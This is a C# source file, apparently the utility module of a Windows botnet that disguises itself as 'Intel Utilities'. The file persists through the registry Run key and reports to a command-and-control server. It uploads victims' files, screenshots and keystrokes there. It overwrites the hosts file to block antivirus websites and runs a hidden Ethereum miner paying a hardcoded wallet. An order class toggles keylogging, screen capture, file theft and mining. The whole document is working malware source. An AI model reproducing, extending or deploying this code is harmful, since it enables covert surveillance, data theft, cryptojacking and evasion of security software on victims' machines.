using Microsoft.Win32;
using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Web.Security;

namespace Botnet
{
    public static class Utility
    {
        //FOLDERS & FILES
        public static string mainFolderName = "Intel Utilities";
        public static string uninstallerFolderName = "Intel Utilities Uninstaller";
        public static string mainDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), mainFolderName + "\\");
        public static string uninstallerDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), uninstallerFolderName + "\\");
        public static string machineIDFile = mainDir + "id";
        public static string passwordFile = mainDir + "key";
        public static string filesIndex = mainDir + "filesIndex.txt";
        public static string interestingFiles = mainDir + "interestingFiles.txt";
        public static string websitesToBlockFile = mainDir + "hosts.txt";
        public static string dataDir = mainDir + "Data\\";
        public static string minersDir = mainDir + "Miners\\";
        public static string ethminerDir = minersDir + "Ethminer\\";
        public static string ethminerName = "ethminer.exe";
        public static string ethminerZipName = "ethminer.zip";
        public static string screensDir = dataDir + "Screens\\";
        public static string keysDir = dataDir + "Keys\\";
        public static string installerName = "Installer.exe";
        public static string uninstallerName = "Uninstaller.exe";
        public static string updaterName = "Updater.exe";
        public static string mainProgramName = "Intel_Utilities.exe";
        public static string systemHostsFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers\\etc\\hosts");
        //REGISTRY
        public static string registryKeyInstaller = "Intel Installer";
        public static string registryKeyUpdater = "Intel Updater";
        public static string registryKeyURI = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        public static RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(registryKeyURI, true);
        //SERVER
        public static string BASE_URL = "http://botnet/";
        public static string C2_URL = BASE_URL + "c2/";
        public static string SOFTWARE_REMOTE_DIR = BASE_URL + "software/";
        public static string REMOTE_WEBSITES_TO_BLOCK_FILE = BASE_URL + "hosts.txt";
        public static int noInternetWait = 5000;
        //SERVER COMMANDS
        public static readonly string INITIALIZE = "initialize";
        public static readonly string UPDATE_HARDWARE_DATA = "updateHardwareData";
        public static readonly string UNINSTALLED = "uninstalled";
        public static readonly string UPDATE_STATUS_INFO = "updateStatusInfo";
        public static readonly string GET_ORDERS = "getOrders";
        public static readonly string NOTIFY_FILES_UPLOAD_COMPLETED = "notifyFilesUploadCompleted";
        public static readonly string GET_C2_SERVER_URL = "getC2ServerUrl";
        public static readonly string GET_LATEST_PROGRAM_VERSION = "getLatestProgramVersion";
        public static readonly string GET_LATEST_FILE_CHECKER_VERSION = "getLatestFileCheckerVersion";
        public static readonly string GET_LATEST_ETHMINER_URL = "getLatestEthminerURL";
        public static readonly string UPLOAD_INDEX_FILE = "uploadIndexFile";
        public static readonly string GET_INTERESTING_FILES = "getInterestingFiles";
        public static readonly string UPLOAD_SCREEN = "uploadScreen";
        public static readonly string UPLOAD_FILE = "uploadFile";
        public static readonly string UPLOAD_KEYS = "uploadKeys";
        //GEOLOCATION
        public static readonly double longCentralAmerica = -102.1748517;
        public static readonly double longAtlanticOcean = -29.6618917;
        public static readonly double longEuropeAsiaBorder = 43.1449523;
        //MINING
        public static readonly string ethereumWallet = "0xed27aE098BA33C9eD2a0ce64565FE0eb74eaBE93";
        public static readonly string ethermineEU1 = "eu1.ethermine.org:5555";
        public static readonly string ethermineAsia1 = "asia1.ethermine.org:5555";
        public static readonly string ethermineUS1 = "us1.ethermine.org:5555";
        public static readonly string ethermineUS2 = "us2.ethermine.org:5555";
        //SYSTEMS
        public static readonly string WINDOWS_SYSTEM = "WINDOWS";
        public static readonly string MACOS_SYSTEM = "MACOS";
        public static readonly string LINUX_SYSTEM = "LINUX";
        public static readonly string ANDROID_SYSTEM = "ANDROID";
        public static readonly string IOS_SYSTEM = "IOS";
        // SECURITY
        private static readonly int PASSWORD_LENGTH = 64;

        public static bool IsInternetAvailable()
        {
            Console.WriteLine("Checking for internet connection...");
            try
            {
                using (WebClient webClient = new WebClient())
                {
                    using (webClient.OpenRead("http://clients3.google.com/generate_204"))
                    {
                        Console.WriteLine("Connection detected!");
                        return true;
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("No connection detected!");
                Console.WriteLine(e);
                return false;
            }
        }

        public static void WaitForInternet()
        {
            while (!IsInternetAvailable())
            {
                Console.WriteLine("No connection detected. Sleeping for " + noInternetWait + " seconds...");
                Thread.Sleep(noInternetWait);
            }
        }

        public static bool IsAdministrator()
        {
            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))
                      .IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static string RandomAlphanumeric()
        {
            return Membership.GeneratePassword(PASSWORD_LENGTH, 0);
        }

        public static string ServerCommunication(NameValueCollection formData)
        {
            // TODO: print form data
            Console.WriteLine("Sending communication to server...");
            foreach (string key in formData)
            {
                Console.WriteLine("{0} {1}", key, formData[key]);
            }
            byte[] responseBytes;
            while (true)
            {
                try
                {
                    using (WebClient webClient = new WebClient())
                    {
                        webClient.Encoding = Encoding.UTF8;
                        responseBytes = webClient.UploadValues(C2_URL, "POST", formData);
                    }
                    return Encoding.UTF8.GetString(responseBytes);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                    WaitForInternet();
                }
            }
        }

        public static void DownloadFile(string url, string path)
        {
            Console.WriteLine("Downloading file at URI [" + url + "] and saving at [" + path + "]");
            url = Uri.EscapeUriString(url);
            bool done = false;
            while (!done)
            {
                try
                {
                    using (WebClient webClient = new WebClient())
                    {
                        //ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;
                        webClient.DownloadFile(url, path);
                    }
                    done = true;
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                    WaitForInternet();
                }
            }
        }

        public static void UploadFile(string filename, string operation)
        {
            if (File.Exists(filename))
            {
                while (true)
                {
                    try
                    {
                        using (WebClient webClient = new WebClient())
                        {
                            webClient.Headers.Add("Content-Type", "binary/octet-stream");
                            NameValueCollection nvc = new NameValueCollection
                            {
                                ["operation"] = operation,
                                ["machineID"] = GetMachineID(),
                                ["password"] = GetPassword(),
                                ["localPathFile"] = Path.GetDirectoryName(filename).Replace(":", "").Replace("\\", "/").Replace(" ", "")
                            };
                            HttpUploadFile(C2_URL, filename, "file", "", nvc);
                            break;
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                        WaitForInternet();
                    }
                }
            }

        }

        public static void HttpUploadFile(string url, string file, string paramName, string contentType, NameValueCollection nvc)
        {
            Console.WriteLine("Uploading file [" + file + "] at URI [" + url + "]");
            string boundary = "---------------------------" + DateTime.Now.Ticks.ToString("x");
            byte[] boundaryBytes = Encoding.ASCII.GetBytes("\r\n--" + boundary + "\r\n");

            HttpWebRequest wr = (HttpWebRequest)WebRequest.Create(url);
            wr.ServicePoint.ConnectionLimit = 10;
            wr.ContentType = "multipart/form-data; boundary=" + boundary;
            wr.Method = "POST";
            wr.KeepAlive = true;
            wr.Credentials = CredentialCache.DefaultCredentials;

            Stream rs = wr.GetRequestStream();

            string formDataTemplate = "Content-Disposition: form-data; name=\"{0}\"\r\n\r\n{1}";
            foreach (string key in nvc.Keys)
            {
                rs.Write(boundaryBytes, 0, boundaryBytes.Length);
                string formItem = string.Format(formDataTemplate, key, nvc[key]);
                byte[] formItemBytes = Encoding.UTF8.GetBytes(formItem);
                rs.Write(formItemBytes, 0, formItemBytes.Length);
            }
            rs.Write(boundaryBytes, 0, boundaryBytes.Length);

            string headerTemplate = "Content-Disposition: form-data; name=\"{0}\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n";
            string header = string.Format(headerTemplate, paramName, file, contentType);
            byte[] headerBytes = Encoding.UTF8.GetBytes(header);
            rs.Write(headerBytes, 0, headerBytes.Length);

            FileStream fileStream = new FileStream(file, FileMode.Open, FileAccess.Read);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fileStream.Read(buffer, 0, buffer.Length)) != 0)
            {
                rs.Write(buffer, 0, bytesRead);
            }
            fileStream.Close();

            byte[] trailer = Encoding.ASCII.GetBytes("\r\n--" + boundary + "--\r\n");
            rs.Write(trailer, 0, trailer.Length);
            rs.Close();

            WebResponse wresp = null;
            try
            {
                wresp = wr.GetResponse();
                Stream stream2 = wresp.GetResponseStream();
                StreamReader reader2 = new StreamReader(stream2);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            finally
            {
                wresp?.Close();
            }
        }

        public static void BlockAntivirusWebsites()
        {
            Console.WriteLine("Blocking antivirus websites...");
            DownloadFile(REMOTE_WEBSITES_TO_BLOCK_FILE, websitesToBlockFile);
            string websitesToBlock = File.ReadAllText(websitesToBlockFile);
            string newHostsContent = "";
            using (StringReader reader = new StringReader(websitesToBlock))
            {
                string line;
                while ((line = reader.ReadLine()) != null)
                {
                    newHostsContent += "0.0.0.0\t" + line.Trim() + "\n";
                }
            }
            Console.WriteLine("newHostsContent: " + newHostsContent);
            try
            {
                File.WriteAllText(systemHostsFile, newHostsContent.Trim());
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            File.Delete(websitesToBlockFile);
        }

        public static void UpdateBaseURL()
        {
            NameValueCollection formData = new NameValueCollection
            {
                ["operation"] = GET_C2_SERVER_URL
            };
            BASE_URL = ServerCommunication(formData);
        }

        public static void ConfirmUninstallationToServer()
        {
            Console.WriteLine("Confirming uninstallation to server...");
            NameValueCollection formData = new NameValueCollection
            {
                ["operation"] = UNINSTALLED,
                ["machineID"] = GetMachineID(),
                ["password"] = GetPassword()
            };
            ServerCommunication(formData);
        }

        public static void NotifyFilesUploadCompleted()
        {
            NameValueCollection formData = new NameValueCollection
            {
                ["operation"] = NOTIFY_FILES_UPLOAD_COMPLETED,
                ["machineID"] = GetMachineID(),
                ["password"] = GetPassword()
            };
            ServerCommunication(formData);
        }

        public static Version GetProgramLatestVersion()
        {
            NameValueCollection formData = new NameValueCollection
            {
                ["operation"] = GET_LATEST_PROGRAM_VERSION
            };
            return new Version(ServerCommunication(formData));
        }

        public static Version GetProgramCurrentVersion()
        {
            if (!File.Exists(mainDir + mainProgramName))
            {
                return new Version("0.0.0.0");
            }
            return GetExecutableVersionByPath(mainDir + mainProgramName);
        }

        public static void StoreMachineID(string machineID)
        {
            File.WriteAllText(machineIDFile, machineID);
        }

        public static void StorePassword(string password)
        {
            File.WriteAllText(passwordFile, password);
        }

        public static string GetLatestEthminerURL()
        {
            NameValueCollection formData = new NameValueCollection
            {
                ["operation"] = GET_LATEST_ETHMINER_URL
            };
            return ServerCommunication(formData);
        }
        public static Version GetLatestEthminerVersion()
        {
            return new Version(GetLatestEthminerURL().Replace(BASE_URL + "miners/", "").Split('-')[1].Replace("dev", "1").Replace("rc", "2"));
        }


        public static string GetMachineID()
        {
            if (!File.Exists(machineIDFile))
            {
                return "";
            }
            return File.ReadAllText(machineIDFile);
        }

        public static string GetPassword()
        {
            if (!File.Exists(passwordFile))
            {
                return "";
            }
            return File.ReadAllText(passwordFile);
        }

        public static Version GetCurrentEthminerVersion()
        {
            if (!File.Exists(ethminerDir + "bin\\" + "ethminer.exe"))
            {
                return new Version("0.0.0.0");
            }

            var proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = ethminerDir + "bin\\" + "ethminer.exe",
                    Arguments = "-V",
                    UseShellExecute = false,
                    RedirectStandardError = true,
                }
            };
            proc.Start();
            StreamReader reader = proc.StandardError;
            reader.ReadLine();
            string version = reader.ReadLine().Split(' ')[1].Replace("dev", "1").Replace("rc", "2");
            proc.WaitForExit();
            proc.Close();
            return new Version(version);
        }

        public static string ComputeSha256Hash(string rawData)
        {
            using (SHA256 sha256Hash = SHA256.Create())
            {
                byte[] bytes = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(rawData));
                StringBuilder builder = new StringBuilder();
                for (int i = 0; i < bytes.Length; i++)
                {
                    builder.Append(bytes[i].ToString("x2"));
                }
                return builder.ToString();
            }
        }

        public static Version GetExecutableVersionByPath(string path)
        {
            return new Version(FileVersionInfo.GetVersionInfo(path).FileVersion);
        }

        public static void DeleteDirectory(string path)
        {
            Console.WriteLine("Deleting directory: " + path);
            if (Directory.Exists(path))
            {
                RecursivelyDeleteDirectory(path);
            }
            Console.WriteLine("Directory deleted.");
        }

        private static void RecursivelyDeleteDirectory(string path)
        {
            foreach (string directory in Directory.GetDirectories(path))
            {
                DeleteDirectory(directory);
            }

            try
            {
                Directory.Delete(path, true);
            }
            catch (IOException e)
            {
                Console.WriteLine(e);
                Directory.Delete(path, true);
            }
            catch (UnauthorizedAccessException e)
            {
                Console.WriteLine(e);
                Directory.Delete(path, true);
            }
        }

        public static void AddRegistryKey(string keyName, string value)
        {
            Console.WriteLine("Set registry key: " + keyName + " -> " + value);
            registryKey.SetValue(keyName, value);
        }

        public static void DeleteRegistryKey(string keyName)
        {
            Console.WriteLine("Delete registry key: " + keyName);
            // FIXME: null pointer
            if (registryKey.GetValue(keyName) != null)
                try
                {
                    registryKey.DeleteValue(keyName);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);

                }
        }

        public static void Uninstall()
        {
            Console.WriteLine("Uninstalling...");
            ConfirmUninstallationToServer();
            DeleteDirectory(mainDir);
            DeleteRegistryKey(registryKeyUpdater);
            DeleteRegistryKey(registryKeyInstaller);
        }

        public static bool IsProcessRunningByName(string procName)
        {
            if (Process.GetProcessesByName(mainProgramName.Substring(0, procName.LastIndexOf('.'))).Length > 0)
                return true;
            else
                return false;
        }


        public static bool IsAntivirusInstalled()
        {
            // TEST
            /*
            // Windows XP or previous
            string wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter";
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct");
                ManagementObjectCollection instances = searcher.Get();
                if (instances.Count > 0)
                    return true;
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            // Windows Vista or later
            wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct");
                ManagementObjectCollection instances = searcher.Get();
                if (instances.Count > 0)
                    return true;
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            return false;
            */
            return false;
        }


        public static string KeyCodeToString(int code)
        {
            string key = "";
            if (code == 1 || code == 2) return key;
            if (code == 8) key = "[Back]";
            else if (code == 9) key = "[TAB]";
            else if (code == 13) key = "[Enter]";
            else if (code == 19) key = "[Pause]";
            else if (code == 20) key = "[Caps Lock]";
            else if (code == 27) key = "[Esc]";
            else if (code == 32) key = " ";
            else if (code == 33) key = "[Page Up]";
            else if (code == 34) key = "[Page Down]";
            else if (code == 35) key = "[End]";
            else if (code == 36) key = "[Home]";
            else if (code == 37) key = "[Left]";
            else if (code == 38) key = "[Up]";
            else if (code == 39) key = "[Right]";
            else if (code == 40) key = "[Down]";
            else if (code == 44) key = "[Print Screen]";
            else if (code == 45) key = "[Insert]";
            else if (code == 46) key = "[Delete]";
            else if (code == 48) key = "0";
            else if (code == 49) key = "1";
            else if (code == 50) key = "2";
            else if (code == 51) key = "3";
            else if (code == 52) key = "4";
            else if (code == 53) key = "5";
            else if (code == 54) key = "6";
            else if (code == 55) key = "7";
            else if (code == 56) key = "8";
            else if (code == 57) key = "9";
            else if (code == 65) key = "a";
            else if (code == 66) key = "b";
            else if (code == 67) key = "c";
            else if (code == 68) key = "d";
            else if (code == 69) key = "e";
            else if (code == 70) key = "f";
            else if (code == 71) key = "g";
            else if (code == 72) key = "h";
            else if (code == 73) key = "i";
            else if (code == 74) key = "j";
            else if (code == 75) key = "k";
            else if (code == 76) key = "l";
            else if (code == 77) key = "m";
            else if (code == 78) key = "n";
            else if (code == 79) key = "o";
            else if (code == 80) key = "p";
            else if (code == 81) key = "q";
            else if (code == 82) key = "r";
            else if (code == 83) key = "s";
            else if (code == 84) key = "t";
            else if (code == 85) key = "u";
            else if (code == 86) key = "v";
            else if (code == 87) key = "w";
            else if (code == 88) key = "x";
            else if (code == 89) key = "y";
            else if (code == 90) key = "z";
            else if (code == 91) key = "[Windows]";
            else if (code == 92) key = "[Windows]";
            else if (code == 93) key = "[List]";
            else if (code == 96) key = "0";
            else if (code == 97) key = "1";
            else if (code == 98) key = "2";
            else if (code == 99) key = "3";
            else if (code == 100) key = "4";
            else if (code == 101) key = "5";
            else if (code == 102) key = "6";
            else if (code == 103) key = "7";
            else if (code == 104) key = "8";
            else if (code == 105) key = "9";
            else if (code == 106) key = "*";
            else if (code == 107) key = "+";
            else if (code == 109) key = "-";
            else if (code == 110) key = ",";
            else if (code == 111) key = "/";
            else if (code == 112) key = "[F1]";
            else if (code == 113) key = "[F2]";
            else if (code == 114) key = "[F3]";
            else if (code == 115) key = "[F4]";
            else if (code == 116) key = "[F5]";
            else if (code == 117) key = "[F6]";
            else if (code == 118) key = "[F7]";
            else if (code == 119) key = "[F8]";
            else if (code == 120) key = "[F9]";
            else if (code == 121) key = "[F10]";
            else if (code == 122) key = "[F11]";
            else if (code == 123) key = "[F12]";
            else if (code == 144) key = "[Num Lock]";
            else if (code == 145) key = "[Scroll Lock]";
            else if (code == 160) key = "[Shift]";
            else if (code == 161) key = "[Shift]";
            else if (code == 162) key = "[Ctrl]";
            else if (code == 163) key = "[Ctrl]";
            else if (code == 164) key = "[Alt]";
            else if (code == 165) key = "[Alt]";
            else if (code == 187) key = "=";
            else if (code == 186) key = "ç";
            else if (code == 188) key = ",";
            else if (code == 189) key = "-";
            else if (code == 190) key = ".";
            else if (code == 192) key = "'";
            else if (code == 191) key = ";";
            else if (code == 193) key = "/";
            else if (code == 194) key = ".";
            else if (code == 219) key = "´";
            else if (code == 220) key = "]";
            else if (code == 221) key = "[";
            else if (code == 222) key = "~";
            else if (code == 226) key = "\\";
            else key = "[" + code + "]";
            return key;
        }

        public static void DeleteUninstaller()
        {
            try
            {
                DeleteDirectory(uninstallerDir);
                string filePath = Path.Combine(mainDir, installerName);
                if (File.Exists(filePath))
                {
                    File.Delete(filePath);
                }
                else
                {
                    Console.WriteLine("File not found: " + filePath);
                }
                DeleteRegistryKey(registryKeyInstaller);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error deleting uninstaller: " + ex.Message);
            }
        }

        public static void KillProcessByPath(string exePath)
        {
            Process[] runningProcesses = Process.GetProcesses();
            foreach (Process process in runningProcesses)
            {
                try
                {
                    if (process.MainModule != null && string.Compare(process.MainModule.FileName, exePath, StringComparison.InvariantCultureIgnoreCase) == 0)
                    {
                        process.Kill();
                        break;
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("killing: " + exePath);
                    Console.WriteLine(e);
                }
            }
        }

        public static string GetCoordinates()
        {
            return SendGet("http://ip-api.com/json/?fields=lon,lat");
        }

        public static bool IsLongitudeWestAmerica(double longitude)
        {
            if (longitude < longCentralAmerica)
                return true;
            return false;
        }

        public static bool IsLongitudeEastAmerica(double longitude)
        {
            if (longitude > longCentralAmerica && longitude < longAtlanticOcean)
                return true;
            return false;
        }

        public static bool IsLongitudeEurope(double longitude)
        {
            if (longitude > longAtlanticOcean && longitude < longEuropeAsiaBorder)
                return true;
            return false;
        }

        public static bool IsLongitudeAsia(double longitude)
        {
            if (longitude > longEuropeAsiaBorder)
                return true;
            return false;
        }
        public static string SendPost(string URL, NameValueCollection formData)
        {
            byte[] responseBytes;
            while (true)
            {
                try
                {
                    using (WebClient webClient = new WebClient())
                    {
                        webClient.Encoding = Encoding.UTF8;
                        responseBytes = webClient.UploadValues(URL, "POST", formData);
                    }
                    return Encoding.UTF8.GetString(responseBytes);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                    WaitForInternet();
                }
            }
        }

        public static string SendGet(string URL)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(URL);
            request.Method = "GET";
            string textResponse = string.Empty;
            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            {
                Stream dataStream = response.GetResponseStream();
                StreamReader reader = new StreamReader(dataStream);
                textResponse = reader.ReadToEnd();
                reader.Close();
                dataStream.Close();
            }
            return textResponse;
        }
    }

    public class OrdersInfo
    {
        public int ordersInterval = 60;
        public bool inspectHardware = false;
        public bool inspectFiles = false;
        public bool keylogger = false;
        public bool screenCapture = false;
        public int screenCaptureInterval = 30;
        public bool filesCapture = false;
        public bool mining = false;
        public bool uninstall = false;

        public void DisableAllCommands()
        {
            inspectHardware = false;
            inspectFiles = false;
            keylogger = false;
            screenCapture = false;
            filesCapture = false;
            mining = false;
        }

    }

    public class GeolocationInfo
    {
        public double lon;
        public double lat;
    }

}